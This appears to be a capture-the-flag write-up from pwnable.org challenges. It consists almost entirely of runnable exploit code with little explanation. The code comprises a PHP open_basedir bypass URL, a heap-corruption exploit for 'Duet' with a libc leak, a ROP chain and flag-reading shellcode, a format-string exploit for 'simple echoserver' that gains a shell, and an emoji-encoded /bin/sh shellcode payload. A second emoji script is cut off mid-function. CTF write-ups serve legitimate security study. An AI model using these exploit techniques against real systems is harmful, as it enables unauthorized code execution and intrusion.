<p><code>http://pwnable.org:19260/?rh=mkdir(&#39;/tmp/w1nd&#39;); chdir(&#39;/tmp/w1nd&#39;); ini_set(&#39;open_basedir&#39;,&#39;..&#39;); chdir(&#39;..&#39;); chdir(&#39;..&#39;); chdir(&#39;..&#39;); chdir(&#39;..&#39;); chdir(&#39;..&#39;); ini_set(&#39;open_basedir&#39;,&#39;/&#39;); echo &quot;open_basedir:&quot;.ini_get(&#39;open_basedir&#39;).&quot;\n&quot;; print_r(scandir(&#39;..&#39;)); echo file_get_contents(&quot;php://filter/convert.base64-encode/resource=/flag.so&quot;); </code>
<img src="https://i.imgur.com/0A6Woax.png" alt=""></p>
<h3 id="duet"><a class="header-link" href="#duet"></a>Duet</h3>
<pre class="hljs"><code><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *

debug = <span class="hljs-number">0</span>

<span class="hljs-keyword">if</span> debug:
    <span class="hljs-comment"># p = process([&#x27;docker&#x27;, &#x27;run&#x27;, &#x27;-i&#x27;, &#x27;0c23e3923320&#x27;])</span>
    p = process([<span class="hljs-string">&#x27;chroot&#x27;</span>, <span class="hljs-string">&#x27;./duet&#x27;</span>, <span class="hljs-string">&#x27;/duet&#x27;</span>], aslr=<span class="hljs-literal">False</span>)
<span class="hljs-keyword">else</span>:
    p = remote(<span class="hljs-string">&#x27;pwnable.org&#x27;</span>, <span class="hljs-number">12356</span>)

ins_map = [<span class="hljs-string">&#x27;琴&#x27;</span>, <span class="hljs-string">&#x27;瑟&#x27;</span>]


<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">alloc</span>(<span class="hljs-params">t: <span class="hljs-built_in">int</span>, l, c</span>):</span>
    p.sendlineafter(<span class="hljs-string">&#x27;:&#x27;</span>, <span class="hljs-string">&#x27;1&#x27;</span>)
    p.sendlineafter(<span class="hljs-string">&#x27;:&#x27;</span>, ins_map[t])
    p.sendlineafter(<span class="hljs-string">&#x27;:&#x27;</span>, <span class="hljs-built_in">str</span>(l))
    <span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(c) &lt; l:
        <span class="hljs-keyword">if</span> <span class="hljs-built_in">isinstance</span>(c, <span class="hljs-built_in">bytes</span>):
            c = c.ljust(l, <span class="hljs-string">b&#x27;\x00&#x27;</span>)
        <span class="hljs-keyword">elif</span> <span class="hljs-built_in">isinstance</span>(c, <span class="hljs-built_in">str</span>):
            c = c.ljust(l, <span class="hljs-string">&#x27;\x00&#x27;</span>)
    p.sendafter(<span class="hljs-string">&#x27;:&#x27;</span>, c)


<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">free</span>(<span class="hljs-params">t: <span class="hljs-built_in">int</span></span>):</span>
    p.sendlineafter(<span class="hljs-string">&#x27;:&#x27;</span>, <span class="hljs-string">&#x27;2&#x27;</span>)
    p.sendlineafter(<span class="hljs-string">&#x27;:&#x27;</span>, ins_map[t])


<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">show</span>(<span class="hljs-params">t: <span class="hljs-built_in">int</span></span>):</span>
    p.sendlineafter(<span class="hljs-string">&#x27;:&#x27;</span>, <span class="hljs-string">&#x27;3&#x27;</span>)
    p.sendlineafter(<span class="hljs-string">&#x27;:&#x27;</span>, ins_map[t])


<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">magic</span>(<span class="hljs-params">num</span>):</span>
    p.sendlineafter(<span class="hljs-string">&#x27;:&#x27;</span>, <span class="hljs-string">&#x27;5&#x27;</span>)
    p.sendlineafter(<span class="hljs-string">&#x27;:&#x27;</span>, <span class="hljs-built_in">str</span>(num))


<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">un_tc</span>(<span class="hljs-params">size</span>):</span>
    <span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">7</span>):
        alloc(<span class="hljs-number">0</span>, size, <span class="hljs-string">&#x27;f&#x27;</span>)
        free(<span class="hljs-number">0</span>)


un_tc(<span class="hljs-number">0x98</span>)
un_tc(<span class="hljs-number">0xe8</span>)
<span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">5</span>):
    alloc(<span class="hljs-number">0</span>, <span class="hljs-number">0xd8</span>, <span class="hljs-string">&#x27;f&#x27;</span>)
    free(<span class="hljs-number">0</span>)
alloc(<span class="hljs-number">1</span>, <span class="hljs-number">0x98</span>, <span class="hljs-string">&#x27;v&#x27;</span> * <span class="hljs-number">0x98</span>)
un_tc(<span class="hljs-number">0x188</span>)
free(<span class="hljs-number">1</span>)

un_tc(<span class="hljs-number">0x1e8</span>)

<span class="hljs-comment"># alloc(0, 0x98, &#x27;v&#x27;)</span>
<span class="hljs-comment"># free(0)</span>
alloc(<span class="hljs-number">0</span>, <span class="hljs-number">0x188</span>, <span class="hljs-string">&#x27;a&#x27;</span>)
payload = <span class="hljs-string">b&#x27;b&#x27;</span> * <span class="hljs-number">0xe0</span> + p64(<span class="hljs-number">0x1f0</span>) + p64(<span class="hljs-number">0x10</span>) + <span class="hljs-string">b&#x27;b&#x27;</span> * <span class="hljs-number">8</span>
alloc(<span class="hljs-number">1</span>, <span class="hljs-number">0xf8</span>, payload)
free(<span class="hljs-number">0</span>)
alloc(<span class="hljs-number">0</span>, <span class="hljs-number">0x98</span>, <span class="hljs-string">&#x27;v&#x27;</span> * <span class="hljs-number">0x98</span>)
magic(<span class="hljs-number">0xf1</span>)
free(<span class="hljs-number">0</span>)
payload = <span class="hljs-string">b&#x27;c&#x27;</span> * <span class="hljs-number">0xf8</span> + p64(<span class="hljs-number">0xa1</span>) + <span class="hljs-string">b&#x27;d&#x27;</span> * <span class="hljs-number">0x98</span> + p64(<span class="hljs-number">0x61</span>)
alloc(<span class="hljs-number">0</span>, <span class="hljs-number">0x1e8</span>, payload)
free(<span class="hljs-number">1</span>)
show(<span class="hljs-number">0</span>)
p.recvuntil(<span class="hljs-string">&#x27;c&#x27;</span> * <span class="hljs-number">0xf8</span>)
p.recv(<span class="hljs-number">8</span>)
heap = u64(p.recv(<span class="hljs-number">8</span>))
libc = u64(p.recv(<span class="hljs-number">8</span>)) - <span class="hljs-number">0x1e4ca0</span>
log.success(<span class="hljs-string">f&#x27;libc :<span class="hljs-subst">{libc:x}</span> heap: <span class="hljs-subst">{heap:x}</span>&#x27;</span>)

free(<span class="hljs-number">0</span>)
alloc(<span class="hljs-number">0</span>, <span class="hljs-number">0x98</span>, <span class="hljs-string">&#x27;nonick&#x27;</span>)
alloc(<span class="hljs-number">1</span>, <span class="hljs-number">0x98</span>, <span class="hljs-string">&#x27;nonick&#x27;</span>)
free(<span class="hljs-number">0</span>)

alloc(<span class="hljs-number">0</span>, <span class="hljs-number">0x200</span>, p64(<span class="hljs-number">0x11</span>) * <span class="hljs-number">20</span>)
free(<span class="hljs-number">0</span>)

payload = <span class="hljs-string">b&#x27;c&#x27;</span> * <span class="hljs-number">0xf8</span> + p64(<span class="hljs-number">0x191</span>) + <span class="hljs-string">b&#x27;e&#x27;</span> * <span class="hljs-number">0xe8</span>
alloc(<span class="hljs-number">0</span>, <span class="hljs-number">0x1e8</span>, payload)

free(<span class="hljs-number">1</span>)
alloc(<span class="hljs-number">1</span>, <span class="hljs-number">0xa8</span>, <span class="hljs-string">&#x27;nonick&#x27;</span>)
free(<span class="hljs-number">0</span>)
fake = p64(<span class="hljs-number">0</span>) + p64(<span class="hljs-number">0xe1</span>) + p64(heap + <span class="hljs-number">0x1b60</span>) + p64(heap + <span class="hljs-number">0x1dd0</span> + <span class="hljs-number">0xe0</span>)
fake = fake.ljust(<span class="hljs-number">0xe0</span>)
fake += p64(<span class="hljs-number">0</span>) + p64(<span class="hljs-number">0xe1</span>) + p64(heap + <span class="hljs-number">0x1dd0</span>) + p64(libc + <span class="hljs-number">0x1E7600</span> - <span class="hljs-number">0x10</span>)
fake += p64(<span class="hljs-number">0x11</span>)
context.arch = <span class="hljs-string">&#x27;amd64&#x27;</span>
alloc(<span class="hljs-number">0</span>, <span class="hljs-number">0x300</span>, fake)
free(<span class="hljs-number">0</span>)
page = heap + <span class="hljs-number">0x20f0</span>
page &gt;&gt;= <span class="hljs-number">12</span>
page &lt;&lt;= <span class="hljs-number">12</span>
sigret = libc + <span class="hljs-number">0x14BC61</span>
fake = p64(sigret) * <span class="hljs-number">3</span>
fake += p64(heap + <span class="hljs-number">0x20f0</span> + <span class="hljs-number">0x20</span>)
fake += p64(<span class="hljs-number">0</span>)
fake += p64(libc + <span class="hljs-number">0x00000000000538e3</span>) + p64(<span class="hljs-number">0</span>)
fake += <span class="hljs-string">b&#x27;\x00&#x27;</span> * <span class="hljs-number">0x30</span>
fake += p64(libc + <span class="hljs-number">0xed5dc</span>)
fake += <span class="hljs-string">b&#x27;\x00&#x27;</span> * (<span class="hljs-number">0xd0</span> - <span class="hljs-number">0x40</span>)
fake += p64(heap + <span class="hljs-number">0x20f0</span> + <span class="hljs-number">0x20</span>)

fake += p64(libc + <span class="hljs-number">0x0000000000026542</span>)
fake += p64(page)
fake += p64(libc + <span class="hljs-number">0x0000000000026f9e</span>)
fake += p64(<span class="hljs-number">0x1000</span>)
fake += p64(libc + <span class="hljs-number">0x000000000012bda6</span>)
fake += p64(<span class="hljs-number">7</span>)
fake += p64(libc + <span class="hljs-number">0x117590</span>)
fake += p64(heap + <span class="hljs-number">0x20f0</span> + <span class="hljs-built_in">len</span>(fake) - <span class="hljs-number">8</span>)

fake += asm(
    <span class="hljs-string">f&#x27;&#x27;&#x27;<span class="hljs-subst">{shellcraft.amd64.linux.echo(<span class="hljs-string">&#x27;aaaa&#x27;</span>)}</span>
            <span class="hljs-subst">{shellcraft.amd64.pushstr(<span class="hljs-string">&#x27;flag&#x27;</span>)}</span>
            lea rdi,[rsp]
            xor rsi,rsi
            mov rax,2
            syscall
             <span class="hljs-subst">{shellcraft.amd64.linux.read(<span class="hljs-number">3</span>, <span class="hljs-string">&#x27;rdi&#x27;</span>, <span class="hljs-number">0x100</span>)}</span>
            <span class="hljs-subst">{shellcraft.amd64.linux.write(<span class="hljs-number">1</span>, <span class="hljs-string">&#x27;rsp&#x27;</span>, <span class="hljs-number">0x100</span>)}</span>&#x27;&#x27;&#x27;</span>
)
alloc(<span class="hljs-number">0</span>, <span class="hljs-number">0x300</span>, fake)
free(<span class="hljs-number">0</span>)

<span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">10</span>):
    sz = <span class="hljs-number">0x3f0</span> - x * <span class="hljs-number">0x10</span>
    data = p64(<span class="hljs-number">0x11</span>) * (sz &gt;&gt; <span class="hljs-number">3</span>)
    <span class="hljs-keyword">for</span> y <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">7</span>):
        alloc(<span class="hljs-number">0</span>, sz, data)
        free(<span class="hljs-number">0</span>)

payload = <span class="hljs-string">b&#x27;c&#x27;</span> * <span class="hljs-number">0xf8</span> + p64(<span class="hljs-number">0xb1</span>) + <span class="hljs-string">b&#x27;e&#x27;</span> * <span class="hljs-number">0xa8</span> + p64(<span class="hljs-number">0xe1</span>) + p64(libc + <span class="hljs-number">0x1e4d70</span>) + p64(heap + <span class="hljs-number">0x1dd0</span>)
alloc(<span class="hljs-number">0</span>, <span class="hljs-number">0x1e8</span>, payload)
free(<span class="hljs-number">1</span>)

io_list = libc + <span class="hljs-number">0x1E5660</span>
log.success(<span class="hljs-string">f&#x27;io list all <span class="hljs-subst">{io_list:x}</span>&#x27;</span>)
vt = libc + <span class="hljs-number">0x1E5B40</span> - <span class="hljs-number">0x18</span>

alloc(<span class="hljs-number">1</span>, <span class="hljs-number">0xd8</span>,
      <span class="hljs-string">b&#x27;\x00&#x27;</span> * <span class="hljs-number">0x28</span> + p64(<span class="hljs-number">0x11</span>) + p64(<span class="hljs-number">0</span>) + p64(<span class="hljs-number">0x211</span>) + p64(<span class="hljs-number">0x11</span>) * <span class="hljs-number">8</span> + p64(<span class="hljs-number">0x11223344</span>) + p64(
          heap + <span class="hljs-number">0x20f0</span> - <span class="hljs-number">8</span>) + p64(heap + <span class="hljs-number">0x1bd0</span> - <span class="hljs-number">0x70</span>) + p64(<span class="hljs-number">1</span>) * <span class="hljs-number">6</span> + p64(vt))

free(<span class="hljs-number">0</span>)
fake = p64(<span class="hljs-number">0xfbad8000</span>) + p64(<span class="hljs-number">0x1441</span>) + p64(<span class="hljs-number">0x1</span>) + p64(<span class="hljs-number">0x1</span>) + p64(<span class="hljs-number">0x5</span>) + p64(<span class="hljs-number">0x6</span>)

payload = <span class="hljs-string">b&#x27;c&#x27;</span> * <span class="hljs-number">0xf8</span> + p64(<span class="hljs-number">0xb1</span>) + <span class="hljs-string">b&#x27;e&#x27;</span> * <span class="hljs-number">0xa0</span> + fake
alloc(<span class="hljs-number">0</span>, <span class="hljs-number">0x1e8</span>, payload)
free(<span class="hljs-number">1</span>)
<span class="hljs-comment"># if debug:</span>
<span class="hljs-comment">#     gdb.attach(p, f&#x27;hbreak *0x1555553bfff8  &#x27;)</span>

p.sendlineafter(<span class="hljs-string">&#x27;:&#x27;</span>, <span class="hljs-string">&#x27;6&#x27;</span>)
p.interactive()</code></pre><h1 id="simple-echoserver"><a class="header-link" href="#simple-echoserver"></a>simple echoserver</h1>
<pre class="hljs"><code>from pwn import *

<span class="hljs-keyword">debug</span> = <span class="hljs-number">0</span>


def <span class="hljs-built_in">exp</span>(<span class="hljs-keyword">p</span>):
    payload = <span class="hljs-string">&#x27;%c&#x27;</span> * <span class="hljs-number">5</span> + <span class="hljs-string">&#x27;%70c%c&#x27;</span> + <span class="hljs-string">&#x27;%c&#x27;</span> * <span class="hljs-number">10</span> + <span class="hljs-string">&#x27;%245c&#x27;</span> + <span class="hljs-string">&#x27;%hhn&#x27;</span> + <span class="hljs-string">&#x27;%c&#x27;</span> * <span class="hljs-number">10</span> + <span class="hljs-string">&#x27;%*c&#x27;</span> + <span class="hljs-string">&#x27;%c&#x27;</span> * <span class="hljs-number">6</span> + <span class="hljs-string">&#x27;%507442c&#x27;</span> + <span class="hljs-string">&#x27;%n&#x27;</span>
    payload = payload.ljust(<span class="hljs-number">256</span>, <span class="hljs-string">&#x27;a&#x27;</span>)
    <span class="hljs-keyword">p</span>.sendafter(<span class="hljs-string">&#x27;name:&#x27;</span>, payload)
    # <span class="hljs-keyword">p</span>.sendafter(<span class="hljs-string">&#x27;phone:&#x27;</span>, <span class="hljs-string">&#x27;6&#x27;</span> * <span class="hljs-number">10</span>)
    <span class="hljs-keyword">p</span>.sendlineafter(<span class="hljs-string">&#x27;!&#x27;</span>, <span class="hljs-string">&#x27;~.&#x27;</span>)


<span class="hljs-keyword">while</span> True:
    <span class="hljs-keyword">try</span>:
        <span class="hljs-keyword">if</span> debu<span class="hljs-variable">g:</span>
            <span class="hljs-keyword">p</span> = process(<span class="hljs-string">&#x27;./simple_echoserver&#x27;</span>, env={<span class="hljs-string">&#x27;LD_PRELOAD&#x27;</span>: <span class="hljs-string">&#x27;./libc-2.27.so&#x27;</span>}, stderr=<span class="hljs-keyword">open</span>(<span class="hljs-string">&#x27;/dev/null&#x27;</span>, <span class="hljs-string">&#x27;w&#x27;</span>))
        <span class="hljs-keyword">else</span>:
            <span class="hljs-keyword">p</span> = remote(<span class="hljs-string">&#x27;pwnable.org&#x27;</span>, <span class="hljs-number">12020</span>)

        # <span class="hljs-keyword">if</span> debu<span class="hljs-variable">g:</span>
        #     gdb.attach(<span class="hljs-keyword">p</span>, <span class="hljs-keyword">f</span><span class="hljs-string">&#x27;vmmap&#x27;</span>)
        # payload = <span class="hljs-string">&#x27;%75c%7$hhn%43$hhn&#x27;</span>
        <span class="hljs-built_in">exp</span>(<span class="hljs-keyword">p</span>)
        <span class="hljs-keyword">p</span>.recv()
        <span class="hljs-keyword">p</span>.sendline(<span class="hljs-string">&#x27;ls&#x27;</span>)
        <span class="hljs-keyword">p</span>.sendline(<span class="hljs-string">&#x27;ls&#x27;</span>)
        data = <span class="hljs-keyword">p</span>.recv()
        <span class="hljs-keyword">if</span> dat<span class="hljs-variable">a:</span>
            <span class="hljs-keyword">print</span>(data)
            <span class="hljs-keyword">p</span>.interactive()
            <span class="hljs-keyword">p</span>.<span class="hljs-keyword">close</span>()
            <span class="hljs-keyword">break</span>
    excep<span class="hljs-variable">t:</span>
        <span class="hljs-keyword">continue</span></code></pre><h3 id="eeemoji"><a class="header-link" href="#eeemoji"></a>eeemoji</h3>
<pre class="hljs"><code><span class="hljs-attribute">from</span> pwn import *

<span class="hljs-attribute">context</span>.log_level = &#x27;debug&#x27;
<span class="hljs-attribute">context</span>.arch = &#x27;amd<span class="hljs-number">64</span>&#x27;
<span class="hljs-attribute">io</span> = remote(<span class="hljs-string">&quot;pwnable.org&quot;</span>,  <span class="hljs-number">31322</span>)

<span class="hljs-attribute">rl</span> = lambda a=False     : io.recvline(a)
<span class="hljs-attribute">ru</span> = lambda a,b=True    : io.recvuntil(a,b)
<span class="hljs-attribute">rn</span> = lambda x           : io.recvn(x)
<span class="hljs-attribute">sn</span> = lambda x           : io.send(x)
<span class="hljs-attribute">sl</span> = lambda x           : io.sendline(x)
<span class="hljs-attribute">sa</span> = lambda a,b         : io.sendafter(a,b)
<span class="hljs-attribute">sla</span> = lambda a,b        : io.sendlineafter(a,b)
<span class="hljs-attribute">irt</span> = lambda            : io.interactive()
<span class="hljs-attribute">dbg</span> = lambda text=None  : gdb.attach(io, text)
<span class="hljs-attribute">lg</span> = lambda s,addr      : log.info(&#x27;\<span class="hljs-number">033</span>[<span class="hljs-number">1</span>;<span class="hljs-number">31</span>;<span class="hljs-number">40</span>m %s --&gt; <span class="hljs-number">0</span>x%x \<span class="hljs-number">033</span>[<span class="hljs-number">0</span>m&#x27; % (s,addr))
<span class="hljs-attribute">uu32</span> = lambda data      : u<span class="hljs-number">32</span>(data.ljust(<span class="hljs-number">4</span>, &#x27;\x<span class="hljs-number">00</span>&#x27;))
<span class="hljs-attribute">uu64</span> = lambda data      : u<span class="hljs-number">64</span>(data.ljust(<span class="hljs-number">8</span>, &#x27;\x<span class="hljs-number">00</span>&#x27;))

<span class="hljs-attribute">def</span> Menu(cmd):
    <span class="hljs-attribute">welcome</span> = u&#x27;\U<span class="hljs-number">0001</span>F<span class="hljs-number">37</span>A\U<span class="hljs-number">0000000</span>A&#x27;.encode(<span class="hljs-string">&quot;utf-8&quot;</span>)
    <span class="hljs-attribute">sla</span>(welcome, cmd)

<span class="hljs-attribute">def</span> Add():
    <span class="hljs-attribute">cmd</span> = u&#x27;\U<span class="hljs-number">0001</span>F<span class="hljs-number">37</span>A&#x27;.encode(<span class="hljs-string">&quot;utf-8&quot;</span>)
    <span class="hljs-attribute">Menu</span>(cmd)

<span class="hljs-attribute">def</span> Show():
    <span class="hljs-attribute">cmd</span> = u&#x27;\U<span class="hljs-number">0001</span>F<span class="hljs-number">42</span>E&#x27;.encode(<span class="hljs-string">&quot;utf-8&quot;</span>)
    <span class="hljs-attribute">Menu</span>(cmd)

<span class="hljs-attribute">def</span> Edit(content):
    <span class="hljs-attribute">cmd</span> = u&#x27;\U<span class="hljs-number">0001</span>F<span class="hljs-number">434</span>&#x27;.encode(<span class="hljs-string">&quot;utf-8&quot;</span>)
    <span class="hljs-attribute">Menu</span>(cmd)
    <span class="hljs-attribute">sl</span>(content)
<span class="hljs-attribute">def</span> unicode_to_utf<span class="hljs-number">8</span>(aint):
    <span class="hljs-attribute">fmt1</span> = &#x27;<span class="hljs-number">0</span>xxxxxxx&#x27;
    <span class="hljs-attribute">fmt2</span> = &#x27;<span class="hljs-number">110</span>xxxxx<span class="hljs-number">10</span>xxxxxx&#x27;
    <span class="hljs-attribute">fmt3</span> = &#x27;<span class="hljs-number">1110</span>xxxx<span class="hljs-number">10</span>xxxxxx<span class="hljs-number">10</span>xxxxxx&#x27;
    <span class="hljs-attribute">fmt4</span> = &#x27;<span class="hljs-number">11110</span>xxx<span class="hljs-number">10</span>xxxxxx<span class="hljs-number">10</span>xxxxxx<span class="hljs-number">10</span>xxxxxx&#x27;
    <span class="hljs-attribute">fmt5</span> = &#x27;<span class="hljs-number">111110</span>xx<span class="hljs-number">10</span>xxxxxx<span class="hljs-number">10</span>xxxxxx<span class="hljs-number">10</span>xxxxxx<span class="hljs-number">10</span>xxxxxx&#x27;
    <span class="hljs-attribute">fmt6</span> = &#x27;<span class="hljs-number">1111110</span>x<span class="hljs-number">10</span>xxxxxx<span class="hljs-number">10</span>xxxxxx<span class="hljs-number">10</span>xxxxxx<span class="hljs-number">10</span>xxxxxx<span class="hljs-number">10</span>xxxxxx&#x27;

    <span class="hljs-attribute">abin</span> = bin(aint)[<span class="hljs-number">2</span>:]
    <span class="hljs-attribute">total</span> = len(abin)

    <span class="hljs-attribute">if</span> total &lt; <span class="hljs-number">8</span>:
        <span class="hljs-attribute">fmt</span> = fmt<span class="hljs-number">1</span>
    <span class="hljs-attribute">elif</span> total &lt; <span class="hljs-number">12</span>:
        <span class="hljs-attribute">fmt</span> = fmt<span class="hljs-number">2</span>
    <span class="hljs-attribute">elif</span> total &lt; <span class="hljs-number">17</span>:
        <span class="hljs-attribute">fmt</span> = fmt<span class="hljs-number">3</span>
    <span class="hljs-attribute">elif</span> total &lt; <span class="hljs-number">22</span>:
        <span class="hljs-attribute">fmt</span> = fmt<span class="hljs-number">4</span>
    <span class="hljs-attribute">elif</span> total &lt; <span class="hljs-number">27</span>:
        <span class="hljs-attribute">fmt</span> = fmt<span class="hljs-number">5</span>
    <span class="hljs-attribute">elif</span> total &lt;= <span class="hljs-number">32</span>:
        <span class="hljs-attribute">fmt</span> = fmt<span class="hljs-number">6</span>  

    <span class="hljs-attribute">fmt</span> = fmt[::-<span class="hljs-number">1</span>]
    <span class="hljs-attribute">abin</span> = abin[::-<span class="hljs-number">1</span>]
    <span class="hljs-attribute">final</span> = &#x27;&#x27;
    <span class="hljs-attribute">i</span> = <span class="hljs-number">0</span>
    <span class="hljs-attribute">for</span> val in fmt:
        <span class="hljs-attribute">if</span> i != total:
            <span class="hljs-attribute">if</span> val == &#x27;x&#x27;:
                <span class="hljs-attribute">final</span> += abin[i]
                <span class="hljs-attribute">i</span> += <span class="hljs-number">1</span>
            <span class="hljs-attribute">else</span> :
                <span class="hljs-attribute">final</span> += val
        <span class="hljs-attribute">else</span> :
            <span class="hljs-attribute">if</span> val == &#x27;x&#x27;:
                <span class="hljs-attribute">final</span> += &#x27;<span class="hljs-number">0</span>&#x27;
            <span class="hljs-attribute">else</span> :
                <span class="hljs-attribute">final</span> += val
    <span class="hljs-attribute">final</span> = int(final[::-<span class="hljs-number">1</span>], <span class="hljs-number">2</span>)
    <span class="hljs-attribute">if</span> final == <span class="hljs-number">0</span>:
        <span class="hljs-attribute">return</span> &#x27;\x<span class="hljs-number">00</span>&#x27;
    <span class="hljs-attribute">else</span> :
        <span class="hljs-attribute">return</span> p<span class="hljs-number">64</span>(final)[::-<span class="hljs-number">1</span>].strip(&#x27;\x<span class="hljs-number">00</span>&#x27;)
        
<span class="hljs-attribute">Add</span>()

<span class="hljs-attribute">payload</span> = unicode_to_utf<span class="hljs-number">8</span>(<span class="hljs-number">0</span>x<span class="hljs-number">11223344</span>)

<span class="hljs-attribute">payload</span> += unicode_to_utf<span class="hljs-number">8</span>(<span class="hljs-number">0</span>x<span class="hljs-number">09</span>e<span class="hljs-number">83</span>bb<span class="hljs-number">0</span>)
<span class="hljs-attribute">payload</span> += unicode_to_utf<span class="hljs-number">8</span>(<span class="hljs-number">0</span>x<span class="hljs-number">2</span>f<span class="hljs-number">000000</span>)
<span class="hljs-attribute">payload</span> += unicode_to_utf<span class="hljs-number">8</span>(<span class="hljs-number">0</span>x<span class="hljs-number">2</span>f<span class="hljs-number">6</span>e<span class="hljs-number">6962</span>)
<span class="hljs-attribute">payload</span> += unicode_to_utf<span class="hljs-number">8</span>(<span class="hljs-number">0</span>x<span class="hljs-number">00006873</span>)
<span class="hljs-attribute">payload</span> += unicode_to_utf<span class="hljs-number">8</span>(<span class="hljs-number">0</span>x<span class="hljs-number">5</span>e<span class="hljs-number">006</span>a<span class="hljs-number">5</span>f)
<span class="hljs-attribute">payload</span> += unicode_to_utf<span class="hljs-number">8</span>(<span class="hljs-number">0</span>x<span class="hljs-number">0</span>f<span class="hljs-number">5</span>a<span class="hljs-number">006</span>a)
<span class="hljs-attribute">payload</span> += unicode_to_utf<span class="hljs-number">8</span>(<span class="hljs-number">0</span>x<span class="hljs-number">00000005</span>)

<span class="hljs-attribute">payload</span> += <span class="hljs-number">200</span>*u&#x27;\U<span class="hljs-number">00005341</span>&#x27;.encode(<span class="hljs-string">&quot;utf-8&quot;</span>)
<span class="hljs-attribute">Edit</span>(payload)

<span class="hljs-attribute">irt</span>()</code></pre><h3 id="eeeeeemoji"><a class="header-link" href="#eeeeeemoji"></a>eeeeeemoji</h3>
<pre class="hljs"><code><span class="hljs-attribute">from</span> pwn import *

<span class="hljs-attribute">context</span>.log_level = &#x27;debug&#x27;
<span class="hljs-attribute">context</span>.arch = &#x27;amd<span class="hljs-number">64</span>&#x27;
<span class="hljs-attribute">io</span> = remote(<span class="hljs-string">&quot;pwnable.org&quot;</span>, <span class="hljs-number">31323</span>)

<span class="hljs-attribute">rl</span> = lambda a=False     : io.recvline(a)
<span class="hljs-attribute">ru</span> = lambda a,b=True    : io.recvuntil(a,b)
<span class="hljs-attribute">rn</span> = lambda x           : io.recvn(x)
<span class="hljs-attribute">sn</span> = lambda x           : io.send(x)
<span class="hljs-attribute">sl</span> = lambda x           : io.sendline(x)
<span class="hljs-attribute">sa</span> = lambda a,b         : io.sendafter(a,b)
<span class="hljs-attribute">sla</span> = lambda a,b        : io.sendlineafter(a,b)
<span class="hljs-attribute">irt</span> = lambda            : io.interactive()
<span class="hljs-attribute">dbg</span> = lambda text=None  : gdb.attach(io, text)
<span class="hljs-attribute">lg</span> = lambda s,addr      : log.info(&#x27;\<span class="hljs-number">033</span>[<span class="hljs-number">1</span>;<span class="hljs-number">31</span>;<span class="hljs-number">40</span>m %s --&gt; <span class="hljs-number">0</span>x%x \<span class="hljs-number">033</span>[<span class="hljs-number">0</span>m&#x27; % (s,addr))
<span class="hljs-attribute">uu32</span> = lambda data      : u<span class="hljs-number">32</span>(data.ljust(<span class="hljs-number">4</span>, &#x27;\x<span class="hljs-number">00</span>&#x27;))
<span class="hljs-attribute">uu64</span> = lambda data      : u<span class="hljs-number">64</span>(data.ljust(<span class="hljs-number">8</span>, &#x27;\x<span class="hljs-number">00</span>&#x27;))

<span class="hljs-attribute">def</span> Menu(cmd):
    <span class="hljs-attribute">welcome</span> = u&#x27;\U<span class="hljs-number">0001</span>F<span class="hljs-number">37</span>A\U<span class="hljs-number">0000000</span>A&#x27;.encode(<span class="hljs-string">&quot;utf-8&quot;</span>)
    <span class="hljs-attribute">sla</span>(welcome, cmd)

<span class="hljs-attribute">def</span> Add():
    <span class="hljs-attribute">cmd</span> = u&#x27;\U<span class="hljs-number">0001</span>F<span class="hljs-number">37</span>A&#x27;.encode(<span class="hljs-string">&quot;utf-8&quot;</span>)
    <span class="hljs-attribute">Menu</span>(cmd)
    <span class="hljs-attribute">ru</span>(&#x27;mmap() at @&#x27;)
    <span class="hljs-attribute">return</span> int(rl(), <span class="hljs-number">16</span>)

<span class="hljs-attribute">def</span> Show():
    <span class="hljs-attribute">cmd</span> = u&#x27;\U<span class="hljs-number">0001</span>F<span class="hljs-number">42</span>E&#x27;.encode(<span class="hljs-string">&quot;utf-8&quot;</span>)
    <span class="hljs-attribute">Menu</span>(cmd)

<span class="hljs-attribute">def</span> Edit(content):
    <span class="hljs-attribute">cmd</span> = u&#x27;\U<span class="hljs-number">0001</span>F<span class="hljs-number">434</span>&#x27;.encode(<span class="hljs-string">&quot;utf-8&quot;</span>)
    <span class="hljs-attribute">Menu</span>(cmd)
    <span class="hljs-attribute">sl</span>(content)
    
<span class="hljs-attribute">def</span> unicode_to_utf<span class="hljs-number">8</span>(aint):
    <span class="hljs-attribute">fmt1</span> = &#x27;<span class="hljs-number">0</span>xxxxxxx&#x27;
    <span class="hljs-attribute">fmt2</span> = &#x27;<span class="hljs-number">110</span>xxxxx<span class="hljs-number">10</span>xxxxxx&#x27;
    <span class="hljs-attribute">fmt3</span> = &#x27;<span class="hljs-number">1110</span>xxxx<span class="hljs-number">10</span>xxxxxx<span class="hljs-number">10</span>xxxxxx&#x27;
    <span class="hljs-attribute">fmt4</span> = &#x27;<span class="hljs-number">11110</span>xxx<span class="hljs-number">10</span>xxxxxx<span class="hljs-number">10</span>xxxxxx<span class="hljs-number">10</span>xxxxxx&#x27;
    <span class="hljs-attribute">fmt5</span> = &#x27;<span class="hljs-number">111110</span>xx<span class="hljs-number">10</span>xxxxxx<span class="hljs-number">10</span>xxxxxx<span class="hljs-number">10</span>xxxxxx<span class="hljs-number">10</span>xxxxxx&#x27;
    <span class="hljs-attribute">fmt6</span> = &#x27;<span class="hljs-number">1111110</span>x<span class="hljs-number">10</span>xxxxxx<span class="hljs-number">10</span>xxxxxx<span class="hljs-number">10</span>xxxxxx<span class="hljs-number">10</span>xxxxxx<span class="hljs-number">10</span>xxxxxx&#x27;

    <span class="hljs-attribute">abin</span> = bin(aint)[<span class="hljs-number">2</span>:]
    <span class="hljs-attribute">total</span> = len(abin)

    <span class="hljs-attribute">if</span> total &lt; <span class="hljs-number">8</span>:
        <span class="hljs-attribute">fmt</span> = fmt<span class="hljs-number">1</span>
    <span class="hljs-attribute">elif</span> total &lt; <span class="hljs-number">12</span>:
